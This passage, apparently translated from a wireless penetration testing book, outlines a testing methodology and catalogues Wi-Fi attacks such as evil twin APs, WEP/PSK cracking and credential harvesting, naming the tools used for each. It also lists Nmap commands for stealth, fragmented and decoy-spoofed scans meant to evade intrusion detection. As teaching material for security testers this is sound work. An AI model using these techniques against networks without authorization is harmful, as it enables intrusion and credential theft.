这六个步骤是渗透测试专家们公认的并且强烈推荐的。这些步骤被用于测试方法学，如 PTES、NIST 800-115 和 OSSTMM。您可以在虚拟化环境中执行这些操作，以帮助测试漏洞上的利用，然后再在生产网络上采取行动。它还有助于通过渗透测试确定问题的根本原因。

无线接入点提供了无线通信的简便性。这也为黑客提供了攻击和获取内部网络访问权限的便利。从内部，他们可以造成严重损害并危害敏感的企业和客户信息。无论他们停在建筑物前面、在建筑物周围驶过，黑客都可以找到进入您网络的方法。遵循无线渗透测试方法论将有助于确定漏洞并提供加固和补救的解决方案。

## 无线攻击和渗透步骤

以下是无线渗透测试期间要采取的步骤：

侦察：

+   扫描无线接入点

+   找到我们的目标接入点

+   识别 SSID 和 MAC 地址

+   广播名称

+   AP 的 Wi-Fi Mac 地址

+   收集加密和密码的信息

+   WEP，WPA，WPA2

+   PSK，AES，TPK

+   嗅探无线网络

+   通过 Wi-Fi 收集网络流量

+   保持不被发现

+   欺骗 IP 或枢纽连接

+   保持低调，不引起任何警觉

攻击和渗透：

+   绕过或攻击安全控制

+   横幅抓取

+   猜测和破解密码

+   SQL 注入

+   通过 HTTP、HTTPS、SSH 和 Telnet 协议获取访问权限

+   欺骗 Mac 地址

+   使用 macchanger 等工具

+   破解无线加密算法

+   Aircrack-ng，Reaver

客户端攻击：

+   本地和远程攻击

+   常用密码

+   在 Linux 上无需登录访问文件

+   操纵操作系统创建后门

+   捕获和破解凭据

+   Wireshark

+   Ettercap NG

扫描网络：

+   识别主机

+   Nmap 扫描器

+   确定网络规模

+   Zenmap 扫描器

漏洞评估：

+   运行自动化或手动漏洞扫描

+   Nessus 漏洞扫描器

+   生成漏洞报告

+   通过 Nessus 漏洞扫描器导出报告

利用和数据捕获：

+   渗透

+   利用无线路由器和访问点未经授权地访问网络资源

+   妥协

+   获得对工作站和服务器的完全管理员权限

+   数据分析

+   报告

总之，无线渗透测试方法论简单地帮助您从侦察到报告的步骤。它还让您了解成为无线渗透测试人员需要做些什么。应该每年进行无线渗透测试，以跟上无线网络面临的不断变化的威胁。在为客户进行无线安全审计时，应参考此方法论。

# 无线攻击技术和方法

以下部分展示了不同类型的无线攻击技术和方法。

## 访问控制攻击

访问控制攻击试图使用无线或规避 WLAN 访问控制措施，如 AP MAC 过滤器和 802.11 端口访问控制：

![Access control attacks](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_01.jpg)

以下部分展示了一些访问控制攻击。

### War driving

War driving 指的是通过监听信标或发送探测请求来发现无线局域网，为进一步的攻击提供一个发射点。工具如 Airmon-ng、DStumbler、KisMAC 和 NetStumbler 可以执行此攻击。War driving 通常由两个人完成，一个人驾驶汽车，另一个人扫描和发现该地区的无线网络。通过正确的软件和应用程序，他们可以设置 GPS 设置来定位这些 Wi-Fi 位置，并保存它们以供以后的无线攻击使用。

![War driving](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_02.jpg)

照片来源：elhombredenegro 通过 photopin cc

### Rogue access points

在企业网络上留下一个不安全的 AP 可能会为受信任的网络创建一个开放的后门，用户可以远程登录到服务器或访问网络设备，如防火墙、交换机和路由器。任何无线路由器或软件 AP 都可以执行此攻击，如下图所示。请避免连接到不安全的无线访问点。在连接到开放或公共 Wi-Fi 网络时，请始终使用 VPN 服务保护自己。

![Rogue access points](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_03.jpg)

### 临时关联

临时关联是直接连接到不安全的无线 AP，以规避 AP 安全性或攻击另一个无线 AP。这是一种非常常见的攻击，如下图所示。我曾经见过无线网络，其中 SSID 已经更改为类似“Hacked”的内容。攻击者通过无线连接并更改无线访问点的安全设置或更改密码以锁定所有者。

![Ad hoc associations](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_04.jpg)

### MAC 地址欺骗

MAC 地址欺骗是指攻击者重新配置自己的 MAC 地址，以冒充授权的 AP 或客户端。这使得攻击者可以通过无线访问点获得完全的网络访问权限，就像他们是受信任的 AP 或客户端一样。这种攻击通常用于付费热点位置，如酒店、机场、咖啡店和其他付费互联网位置。MAC 地址欺骗攻击如下图所示：

![MAC spoofing](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_05.jpg)

### 802.11 RADIUS 破解

我们很少听到这种攻击，但这是一个重要的话题。这种攻击是指攻击者通过对 802.11 访问请求进行暴力破解来恢复**远程身份验证拨号用户服务**（**RADIUS**）的密钥，以进行恶意使用。在 AP 和 RADIUS 服务器之间的局域网网络上，任何数据包捕获工具都可以使用。这是非常危险的，因为很多 AP、服务器甚至软件服务都会要求 RADIUS 登录。如果 RADIUS 被攻破，攻击者可以访问任何使用 RADIUS 进行授权访问的内容。这种攻击在下图中有所说明：

![802.11 RADIUS 破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_06.jpg)

## 机密攻击

这些攻击试图拦截通过无线网络发送的私人信息，无论是以明文发送还是由 802.11 或更高层协议加密发送。

![机密攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_07.jpg)

照片来源：ivoryelephantphotography via photopin cc

接下来的部分描述了一些机密攻击。

### 窃听

当然我们知道窃听是什么意思，但你知道在安全领域中是什么意思吗？在计算机安全方面，窃听是指捕获数据，解码，然后获取潜在的敏感信息。这就像窃听电话一样。你听、记录，然后可能从对话中获取敏感信息。工具如 Ettercap、Kismet 和 Wireshark 都可以做到这一点。这种攻击在下图中有所说明：

![窃听](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_08.jpg)

### WEP 密钥破解

啊，是时候谈谈 WEP 破解了！这正如它听起来的那样——使用被动或主动方法捕获数据以恢复 WEP 密钥。随着今天硬件和软件的不断改进，WEP 加密可以在不到 5 分钟的时间内轻松破解！只有在仍在使用旧硬件的情况下才应该使用 WEP 加密；否则，你应该使用 WPA2 加密。工具如 Aircrack-ng、AirSnort、Airoway、chopchop 和 dwepcrack 都可以执行这些攻击。下面的截图显示了 WEP 密钥破解的一个例子：

![WEP 密钥破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_09.jpg)

### 恶意双子 AP

听说过恶意双子 AP 吗？恶意双子 AP 就像一个伪装的接入点。攻击者创建一个假的无线 AP，诱使用户认为它是一个可信赖的无线网络。他们通过放大信号的方式，使客户端自动连接到他们，因为信标更快，范围更近。工具如 Honeypot、CqureAP、D-Link G200、HermesAP、Rogue Squadron 和 WifiBSD 都可以执行这些攻击。下图显示了一个流行的工具：

![恶意双子 AP](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_10.jpg)

### AP 钓鱼

攻击者在假 AP 上运行一个虚假的 Web 门户或 Web 服务器，以窃取登录信息、银行账户和信用卡号。这绝对是最危险和最可怕的攻击之一，因为普通用户甚至看不到正在发生的攻击。他们会认为这是真正的网站，而实际上攻击者只是在等待他们登录，以在另一端获取他们的信息。工具如 Airpwn、Airsnarf、Hotspotter、Karma 和 RGlueAP 都可以执行这些攻击。

![AP 钓鱼](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_11.jpg)

照片来源：infocux Technologies via photopin cc

### 中间人攻击

我当然希望你以前听说过这种攻击方法；如果没有，现在你就知道了！中间人攻击是指攻击者在你和另一个目标之间拦截网络流量。攻击者可以利用这种攻击手段在有线或无线网络上获取用户名、密码、查看电子邮件、查看网站的 HTTP 会话等等。工具如 dsniff、Ettercap-NG 和 sshmitm 都可以执行这些攻击。这种攻击在下图中有所说明：

![中间人攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_12.jpg)

## 凭证攻击

是否听说过或经历过用户的在线帐户被入侵的情况？很可能，这个用户是凭证攻击的受害者，这与攻击者窃取其登录凭证有关。这可以通过 Web 服务器或软件，如**社会工程工具包**（**SET**）来实现。攻击者可以克隆一个网站，使网站看起来足够真实和合法，以欺骗用户登录。他们不知道的是，现在有人完全访问他们的数据。在接下来的部分中，我们将讨论凭证收割机和网络钓鱼攻击方法。

### 凭证收割机

这种攻击在攻击者的系统上启动一个 Apache 服务器，以克隆一个网站，使其看起来像合法网站。攻击者可以加入无线访问点，并对假网站进行 DNS 欺骗 HTTP 请求。该网站将看起来与真实网站相同，用户尝试正常登录。在攻击者的端口，攻击者将能够看到用户的用户名和密码，以及该用户的 IP 地址。从这里，攻击者可以继续收集帐户登录信息，然后将其存储在生成的报告中。对组织员工进行社会工程攻击以测试他们是否遵循程序和安全政策至关重要。这在以下屏幕截图中显示：

![凭证收割机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_13.jpg)

### 网络钓鱼

那么什么是网络钓鱼，我们如何识别网络钓鱼攻击、诈骗或骗局？网络钓鱼是一种欺诈性的尝试，旨在收集用户名、密码、社会安全号码、电话号码和信用卡等敏感信息。这些攻击通常通过电子邮件直接发送给用户，告诉用户访问有关其信息更新、密码更改或验证信息的网站。保护自己免受网络钓鱼计划的最佳方法是了解它们的工作原理。要求您输入密码或更改密码的电子邮件来自未知发件人，很可能是伪造的电子邮件。这些电子邮件将需要被阻止或标记为网络钓鱼或垃圾邮件。如果您认为自己是网络钓鱼的受害者，立即更改您的密码和安全问题，以防止在线帐户中的任何损害或丢失信息。

## 身份验证攻击

攻击者使用身份验证攻击来窃取合法用户身份和凭证，以访问私人网络和服务。

![身份验证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_14.jpg)

照片来源：FutUndBeidl 通过 photopin cc

以下部分解释了一些身份验证攻击。

### 共享密钥猜测

攻击者尝试通过使用供应商默认凭证或共享密钥生成器来猜测 802.11 共享密钥身份验证。所有共享密钥都不应保留为默认值，并且在设置和配置设备时应立即更改。任何破解工具，如 Aircrack-ng，都可以执行此攻击。

![共享密钥猜测](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_15.jpg)

照片来源：marc falardeau 通过 photopin cc

### PSK 破解

PSK 破解攻击使用字典攻击工具从捕获的握手帧中恢复 WPA/WPA2 PSK。这种攻击实际上取决于 WPA/WPA2 密钥的加密强度。如果密钥非常强大，可能需要数周才能破解，这对于黑客来说可能不值得花费时间。在创建自己的密码时，始终要使用字母、数字和符号的组合。您的字符计数越长，您成为目标的可能性就越小。诸如 coWPAtty、genpmk、KisMAC 和 wpa_crack 之类的工具可以执行这些攻击。以下屏幕截图显示了 PSK 破解攻击：

![PSK 破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_16.jpg)

### 嗅探应用凭证

在嗅探应用凭据时，攻击者从明文应用协议中捕获用户凭据，例如电子邮件地址和密码。现在更多的网站正在使用 HTTPS，这在流行的网站上不太可能发生；然而，当登录到无线路由器或接入点时，通常使用未加密的明文 HTTP。如果您通过 HTTP 协议登录，攻击者可以轻松看到您的用户名和密码。Ace Password Sniffer，dsniff，PHoss 和 Win Sniffer 等工具可以执行这些攻击。

![嗅探应用凭据](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_17.jpg)

照片来源：formalfallacy @ Dublin (Victor)通过 photopin cc

### 破解域帐户

在破解域帐户攻击时，攻击者通过使用暴力或字典攻击工具破解 NetBIOS 密码哈希来恢复用户的凭据，例如他们的 Windows 登录和密码。还有一些可用的工具将需要从 Internet Explorer，Firefox 和 Google Chrome 中保存的密码。一旦攻击者获得您的凭据，他们可能会访问网络共享，交换电子邮件，甚至可能 compromise 整个域，如果该帐户恰好具有管理权限。John the Ripper，L0phtCrack 和 Cain 等工具可以执行这些攻击。

![破解域帐户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_18.jpg)

照片来源：ntr23 通过 photopin cc

### VPN 登录破解

攻击者通过对 VPN 认证协议进行暴力攻击来恢复用户凭据，例如 PPTP 或 IPsec 密码。确保密码和预共享密钥彼此不同并且非常强大。易于猜测的密码或数字可以轻松地危害整个业务，这可能导致客户信息泄露。-scan，IKECrack，anger 和 THC-pptp-bruter 等工具可以执行这些攻击。以下图表说明了 VPN 登录破解攻击：

![VPN 登录破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_19.jpg)

### 802.11 身份盗窃

在 802.11 身份盗窃攻击中，攻击者从无线 802.11 的明文中捕获用户配置文件。加密是确保没有数据泄露的关键。在连接到 Wi-Fi 网络时，使用 HTTPS 和 VPN 协议可以帮助保护您免受此类攻击。Wireshark 或 Ettercap-NG 等捕获工具可以做到这一点。

![802.11 身份盗窃](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_20.jpg)

照片来源：B Rosen 通过 photopin cc

### 802.11 密码猜测

在 802.11 密码猜测攻击中，攻击者使用捕获的身份不断尝试猜测用户在 802.11 认证上的密码。攻击者很可能会继续猜测默认密码，供应商名称，最常见的密码，生日，姓名，电话号码等，直到他们完全访问该无线网络。如果攻击者有一个非常好的密码字典，他们可以轻松地运行字典攻击并在几个小时内获得访问权限。John the Ripper 和 THC Hydra 等工具可以执行这些攻击。

![802.11 密码猜测](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_21.jpg)

照片来源：Dev.Arka 通过 photopin cc

### 802.11 LEAP 破解

在 802.11 LEAP 破解攻击中，攻击者通过使用字典攻击工具来破解 NT 密码哈希从捕获的 802.11 LEAP 数据包中恢复用户凭据。这取决于密码的强度，如果非常好，那么不太可能被破解，这就是为什么有一个混合字母，数字和符号以防止这些字典攻击是非常重要的。Anwrap，Asleap 和 THC-LEAPcracker 等工具可以执行这些攻击。以下是一个示例截图：

![802.11 LEAP 破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_22.jpg)

### 802.11 EAP 降级攻击

802.11 要求 EAP 在连接用户和认证之间发送消息。如果攻击者能够将自己置于客户端和认证之间，那么连接的用户就会连接到网络。攻击者通过使用伪造的 EAP-Response/NAK 数据包，迫使无线 802.11 设备或服务器提供较弱类型的认证。由于认证非常薄弱，攻击者只需几分钟就能迅速获得访问权限。诸如 File2air 和 libradiate 之类的工具可以执行这些攻击。以下截图显示了一个示例：

![802.11 EAP 降级攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_23.jpg)

### 无线网络问题

随着今天的技术飞速发展，我们所知道的互联网每天都面临着许多新威胁。犯罪分子利用新的恶意软件和社会工程攻击来针对弱势用户和组织。最终用户通过 Wi-Fi 连接并使用网络浏览器上网。在接下来的部分中，我们将讨论当今网络上犯罪分子使用的最常见攻击方法。

![无线网络问题](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_24.jpg)

照片来源：woodleywonderworks 通过 photopin cc

以下部分描述了针对用户级别的最常见攻击之一。

#### 下载

下载是使用互联网的最大特点之一。用户可以快速下载音乐、视频、电子书等。如果用户从未知来源下载，他们不仅可能对自己的计算机构成严重威胁，还可能对整个网络构成威胁。下载是危险的，因为大多数下载不需要用户的许可。

这就是恶意软件介入的地方。如果用户打开他们的电子邮件并点击超链接，通常会将他们重定向到他们的网络浏览器进行查看；然而，如果超链接重定向到恶意软件，它将立即下载并在计算机上执行。在下载时，最好考虑你的来源。这是一个合法的网站吗？你能信任它吗？如果不能，你不应该访问该网站，更不用从中下载文件。

![下载](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_25.jpg)

# 预防

保护自己免受许多威胁的最佳方法是强大的端点保护，如频繁更新和升级、系统配置、定期监测漏洞以及连接到强大的 VPN 服务。如果你在组织中拥有 IT 的全部责任，你的员工应该接受良好的教育，了解犯罪分子背后的危险，并知道在使用计算机和电话系统时采取良好的安全措施。

![预防措施](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_02_26.jpg)

照片来源：woodleywonderworks 通过 photopin cc

一些员工可能违反公司政策，访问他们的社交网络或在线游戏。这些员工需要随时受到监控。只需一次点击，你就可能陷入灾难性的境地。随着犯罪分子不断更新其恶意软件并发现零日漏洞，定期进行网络审计并通过电子邮件或 RSS 订阅保持信息更新总是一个好主意。

连接到公共无线热点时，一定要使用 VPN 服务进行连接。我无法再次强调这一点有多重要。如果不使用 VPN，你的所有互联网流量都将在整个网络中未加密传输。如果攻击者恰好也在同一网络上，你的登录凭据、信用卡和银行信息都可能落入黑客手中。这些黑客很可能会自己使用或在黑市上出售。

我的策略是始终问自己一个问题，随之而来的是更多问题。例如，有人告诉您他们在互联网上免费获得了软件，并希望与您分享。他们向您解释说，您需要关闭防病毒软件，因为需要在上面运行一个破解。您会安装这个软件吗？我绝对希望不会。信任是一个巨大的问题，也可能是 IT 世界和现实生活中最难做到的事情之一。

# 总结

在本章中，我们介绍了进行无线渗透测试时要采取的步骤，以及无线渗透测试中涉及的常见攻击技术。无线技术正在全球范围内得到应用，并扩展了通信的能力。

无线渗透方法包括：侦察、攻击和渗透、客户端攻击、进入网络、漏洞评估、利用和数据捕获，以进行成功的无线渗透测试。安全中使用的关键元素是防火墙。适当的配置是提供安全级别服务的关键。

如果您的网络设备配置不正确，那么您可能比没有它更好。认为自己很安全，而实际上一点也不安全，这是一个危险的情况。随着网络变得更加复杂，您会希望确保使用 VPN 和隧道协议来确保安全的远程访问。

我们还讨论了可以在无线网络上使用的几种不同的攻击方法。无线攻击技术包括但不限于访问控制攻击、机密攻击、凭证攻击、认证攻击以及无线网络的问题。我们充分意识到了用户可能面临的潜在威胁。关键点在于了解连接到无线接入点和互联网时我们面临的威胁。


# 第三章：足迹和侦察

我们希望您喜欢阅读上一章，并发现它非常信息丰富，因为它涵盖了许多有用的信息。作为作者，我的目标是尽可能详细地涵盖尽可能多的信息，以便您作为读者能够理解并在现实世界中使用它！在本章中，我将介绍如何扫描无线网络以获取信息，不同的无线扫描方法，以及它们如何既可以用于好用也可以用于坏。

您可能会问或认为扫描无线网络有多难？任何人都可以做到！是的，但是，如果 SSID 是隐藏的呢？您能找到隐藏的无线网络吗？普通用户很可能不知道隐藏的无线网络甚至存在。

您可能还会问，隐藏的无线网络有什么重要性？您可能认为这是一项很好的安全措施，可以隐藏在他人之外。是的，确实如此！不幸的是，隐藏的无线网络可以被用于恶意和其他非法目的。

例如，假设您是一家企业的安全顾问。一位同事告诉您，一些文件在营业时间结束后由一个既没有办公时间后的物理访问权限也没有远程访问权限的用户更改或丢失了。您验证了修改文件的时间戳以及凌晨 2 点后删除的文件，还发现了登录并进行更改的用户的姓名。现在，这个用户告诉您他们什么都没做。那天下午晚些时候，您的同事告诉您，他们看到该用户在他们的小隔间里设置了一个无线接入点或路由器。您问您的老板是否可以搜索用户的工作区域以解决安全问题。在搜索该区域后，您发现了一个连接在桌子下的无线接入点。这绝对不好！现在，任何人都可以在无线范围内的任何地方访问公司的网络，并访问网络共享和服务器。

# 什么是足迹和侦察？

足迹和侦察是指收集有关客户网络的信息，以根据收集的信息创建基于概要的概要。攻击者必须以安全和专业的方式从组织中获取信息，而不暴露信息。

足迹通常涉及两个侦察步骤。第一步是从目标处收集信息，以确定网络范围的范围。用于此目的的最常用工具是：

+   nslookup

+   whois

在您的足迹和侦察期间，您应该收集以下信息：

+   联系人姓名，电话号码和电子邮件地址

+   每个位置和分支办公室

+   公司安全政策

为了获得更好的结果，尝试发送电子邮件或致电其中一名员工，并进行社会工程技术，以查看他们愿意提供多少信息。然后，审查安全意识培训可能需要改进的领域。

# 无线网络发现

在下一节中，我们将介绍网络和安全管理员推荐的最佳网络应用程序。这些类型的应用程序可以轻松检测到恶意硬件、软件许可证违规，甚至可以检测到故障或性能问题。我选择的应用程序考虑了多样性和可靠性。

![无线网络发现](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_01.jpg)

照片来源：pobre.ch 通过 photopin cc

尽管我们只将涵盖两种网络发现工具，但我们将分享一些我们认为可以帮助您和您的公司的更多应用程序。

## Nmap

**网络映射器**（**Nmap**）是最受欢迎的端口扫描器和网络发现工具之一。它适用于所有主要操作系统平台。以下是一个示例截图：

![Nmap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_02.jpg)

有关 Nmap 的更多信息，请参考[`nmap.org/`](http://nmap.org/)。

## Nmap 命令

Nmap 有很多命令选项，我很确定我们并不总是能够记住这些命令。最终，关键在于了解你的命令以及在特定情况下使用什么命令。作为一名渗透测试者，需要高效地掌握这些工具中的大部分。其中一些解释如下：

+   **操作系统和版本检测**：这些命令将显示操作系统和软件版本的结果，如下截图所示：![Nmap commands](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_03.jpg)

以下是一些命令：

+   `nmap -A 192.168.10.1`：这个命令将显示操作系统、服务版本和路由跟踪输出。

+   `nmap -v -A 192.168.10.1`：这个命令将在扫描过程中显示更详细的信息，包括操作系统、服务版本和路由跟踪输出。

+   `nmap -O 192.168.10.1`：这个命令将只显示操作系统。添加`-osscan-guess`可以使扫描更积极地猜测。

+   `nmap -A -iL /tmp/nmapscan.txt`：这个命令将扫描操作系统、服务版本，并运行路由跟踪。然后，它将从文本文件中输入主机或网络的列表。

+   **服务扫描**：这些命令将显示主机上运行的服务和端口的结果，并且还可以帮助找出主机或网络是否受到防火墙的保护。这在下面的截图中有所说明：![Nmap commands](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_04.jpg)

以下是一些执行服务扫描的命令：

+   `nmap -sV 192.168.10.1`：这个命令将寻找开放的端口，以确定正在运行的服务和版本。

+   `nmap -sA 192.168.10.1`：这个命令用于扫描防火墙策略。它将显示有关防火墙是否只是阻止 SYN 数据包的数据包过滤器的信息。一个 ACK 数据包被发送到目的地；如果它收到响应，那么它是开放的；如果它没有收到响应，那么它正在运行数据包过滤器。

+   **绕过防火墙过滤器**：这个命令允许你扫描由防火墙保护的主机或网络。这个命令还取决于运行的防火墙过滤器。该技术如下截图所示：![Nmap commands](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_05.jpg)

以下是一些命令：

+   `nmap -PN 192.168.10.1`：这个命令将扫描主机，就好像它在线一样。如果你无法通过 ping 或扫描到达主机，这可能会有用。

+   `nmap -PS 192.168.10.1`：这个命令将对给定端口运行 TCP SYN 发现扫描。

+   `nmap -PA 192.168.10.1`：这个命令将对给定端口运行 ACK 发现扫描。

+   **扫描防火墙漏洞**：这些命令将扫描常见的防火墙漏洞，这些漏洞可能存在于 TCP 网络协议中寻找漏洞：![Nmap commands](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_06.jpg)

以下是一些命令：

+   `nmap -sN 192.168.10.1`：这个命令是一个空扫描。空扫描不设置任何位，因此可以用来绕过非状态防火墙和数据包过滤器。

+   `nmap -sF 192.168.10.1`：这个命令是一个 FIN 扫描。FIN 扫描将只设置 TCP FIN 位。当一个 FIN 数据包被发送到一个开放的端口时，开放的端口将简单地忽略数据包，而关闭的端口将被发送回一个 RST 数据包，然后显示 Nmap 中哪些端口是开放的和关闭的。

+   `nmap -sX 192.168.10.1`：这个命令是一个 Xmus 扫描。Xmus 扫描可用于确定目标机器上的端口是开放还是关闭。这个扫描发送带有数据包头中所有标志的 TCP 段。

+   **数据包片段**：这个命令将 TCP 头拆分成几个数据包，以使数据包过滤器、入侵检测系统和防火墙更难检测到你的扫描。如果你想在网络上运行隐秘扫描而不引起注意，这些命令是必不可少的。以下是一个例子：

+   `nmap –sS –p 80 –f 192.168.10.1`：此命令是 TCP SYN 扫描，扫描`192.168.10.1`上的端口`80`，而不会触发入侵检测系统或警报。请理解，这也取决于防火墙或 IDS 配置和策略。此命令在以下截图中有示例：

![Nmap 命令](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_07.jpg)

+   **防火墙诱骗**：此命令允许您欺骗远程主机的主机。如果欺骗正确，IDS 和网络管理将不知道正在进行网络扫描。以下是一个示例命令：

+   `nmap –n 192.168.10.1 –D 192.168.20.3`：此命令扫描一个主机而不发送 DNS 请求，并且还为`192.168.20.3`设置了一个欺骗，使扫描看起来像是`192.168.20.3`在运行扫描，而不是 Kali Linux 主机。此命令在以下截图中有示例：

![Nmap 命令](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_08.jpg)

## Zenmap

**Zenmap**是 Nmap 的多平台图形前端。它使 Nmap 更易于使用，并且配备了预配置的命令，可以快速运行扫描。

![Zenmap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_09.jpg)

有关 Zenmap 的更多信息，请参考[`nmap.org/zenmap/`](http://nmap.org/zenmap/)。

# 无线扫描

无线接入点不断搜索其他无线接入点。802.11 无线电在 2.4 GHz 至 5.85 GHz 的频率上进行扫描。有两种不同的扫描方法，**被动**和**主动**。默认情况下，802.11 无线电在国家操作法允许的所有信道上执行这两种扫描。

![无线扫描](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_10.jpg)

照片来源：@jbtaylor 通过 photopin cc

未经 FCC 许可或许可进行操作的处罚可能会让您支付一大笔罚款。你可能会问 FCC 是谁？**联邦通信委员会**（**FCC**）管理和监管美国的电信行业，包括互联网。为什么我们要关心这个？互联网的目标是让任何人都能够访问，而不受歧视、阻塞、审查或限制网络。总结一下，FCC 正在提出新的互联网政策和合同，允许互联网服务提供商收取额外费用或推出“付费使用”服务，如果您没有额外的钱来支付，将会减慢您的互联网速度。在进行任何本地广播或扫描之前，请参考您所在国家的 LCT。

## 被动扫描

**被动扫描**监听信标和探测响应。来自客户端的无线电每秒扫描一次，然后审核无线网络上的数据包。被动扫描始终启用，因为它用于将客户端连接到接入点。

## 主动扫描

**主动扫描**仅在政府法规允许的信道上执行。主动扫描默认启用；但是，可以在无线适配器的配置文件或配置中禁用。在主动扫描期间，无线电发送带有空 SSID 名称的探测请求，以从区域内的其他设备获取探测响应。换句话说，接入点主动寻找其他设备，并监听它们：

![主动扫描](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_24.jpg)

## 扫描工作原理

为了扫描超出操作范围，接入点必须更改信道。这些来自接入点的无线 RF 信道扫描每秒执行一次，并在不同的信道范围内执行，直到循环遍历所有信道。

![扫描工作原理](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_25.jpg)

然后，无线接入点将离开 RF 信道约 25-30 毫秒。扫描被安排在避免干扰其他信标传输的时间。然后一旦信道更改完成，探测包就会被发送。请记住，如果检测到语音、视频或其他大量数据使用，扫描频率将会降低。

# 嗅探无线网络

我知道你在想什么...我真的能闻到无线网络的味道吗？不，但是，通过正确的工具和硬件，你可以！无线嗅探是无线网络上特殊应用程序或工具使用的窃听技术。嗅探比无线更具侵入性，后者在网络中徘徊。无线嗅探的目标是解决无线网络上的网络问题和协议。

无线和有线连接都可以被监视和嗅探。无线网络更容易被嗅探，因为它们使用无线电信号进行通信。攻击者可以坐在建筑物外的汽车中，嗅探无线网络，以收集敏感信息以获取个人利益、关注或甚至金钱。

网络将信息分成称为**帧**的小块。这些帧内部有数据包。攻击者可能会针对帧、数据包或两者。

通过定位帧，攻击者可能会发现区域内隐藏的无线网络，如果这些网络没有使用最新的无线加密标准，攻击者可能会获得未经授权的访问。网络管理员使用这些技术来解决网络问题。

## Wireshark 应用程序

Wireshark 是一个免费的开源数据包分析器。它用于网络故障排除和分析。它捕获网络数据包并详细显示这些数据包。网络和安全管理员依赖 Wireshark 来解决网络和安全问题。

多年前，有许多不同的工具可供使用，而这些工具使用起来相当昂贵。Wireshark 通过向公众免费提供自己来改变了这一点。Wireshark 是当今最好的开源数据包分析器之一。

Wireshark 有许多很好的用途。网络管理员将使用它来识别和解决网络问题。网络安全工程师可以检查安全问题。开发人员可以调试协议实现。用户可以深入了解网络协议的工作原理，以及它们如何被攻击者可能威胁到。

在现实世界中，Wireshark 非常有用，可以查看实时数据包以确定 Web 应用程序问题、三向 TCP 握手等身份验证问题和审计。Wireshark 将向您显示数据包的起源地、数据包的目的地以及它们的用途。

例如，您可以查看网络上是否有用户使用的带宽比其他用户多。这个用户可能在工作时间大量下载或观看 YouTube 视频。您可以降低该用户的带宽，以便不会拖慢其他人的网络速度。

